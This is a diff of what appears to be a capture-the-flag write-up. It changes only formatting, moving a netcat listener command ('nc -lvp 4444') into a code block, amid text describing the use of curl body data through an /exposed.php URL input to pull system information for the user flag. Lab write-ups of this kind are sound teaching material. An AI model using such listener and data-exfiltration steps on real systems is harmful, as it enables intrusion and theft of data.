@@ -92,7 +92,10 @@ The page `/exposed.php` has a text input, and when passing a URL it displays on 
 
 Checking `curl` man's page for ways to get more information about the system, I thought of sending information through body data. That was enough for getting the user flag.
 
-Set up listener from attacker: `nc -lvp 4444`
+Set up listener from attacker: 
+```
+nc -lvp 4444
+```
 
 Add the following to the input in /exposed.php: 
 ```
